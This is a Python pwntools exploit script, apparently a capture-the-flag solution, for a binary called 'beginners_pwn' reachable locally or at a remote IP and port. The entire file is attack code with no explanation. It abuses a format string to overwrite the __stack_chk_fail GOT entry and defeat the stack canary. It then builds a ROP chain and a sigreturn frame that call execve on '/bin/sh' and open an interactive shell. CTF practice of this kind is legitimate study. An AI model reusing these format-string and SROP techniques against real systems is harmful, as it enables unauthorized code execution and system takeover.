#!/usr/bin/env python
from pwn import *

if len(sys.argv) == 1:
    s = process('./beginners_pwn')
else:
    s = remote('35.221.81.216', 30002)

elf = ELF('./beginners_pwn')

ret = 0x401256
pop_rdi = 0x4012c3
pop_rsi_r15 = 0x4012c1
syscall = 0x40118f

payload = ''
payload += '%8$d%1$s'
payload = payload.ljust(0x10, '\0')
payload += p64(elf.got['__stack_chk_fail'])
s.sendline(payload)
time.sleep(0.1)

s.sendline(str(ret))
time.sleep(0.1)

payload = ''
payload += 'A' * 0x11
payload += p64(pop_rdi)
payload += p64(elf.bss())
payload += p64(pop_rsi_r15)
payload += p64(0x21) + p64(0)
payload += p64(elf.symbols['readn'])
payload += p64(syscall)
payload += p64(0) * 0xd
payload += p64(elf.bss())       # rdi
payload += p64(0) * 0x4         # rsi, rdx, etc.
payload += p64(0x3b)            # rax
payload += p64(0)               # rcx
payload += p64(elf.bss(0x200))  # rsp
payload += p64(syscall)         # rip
payload += p64(0)               # eflags
payload += p64(0x33)            # csgsfs
payload += p64(0) * 5
s.sendline(payload)
time.sleep(0.1)

s.send('/bin/sh\0' + 'A' * 0x18 + '\x0f')

s.interactive()
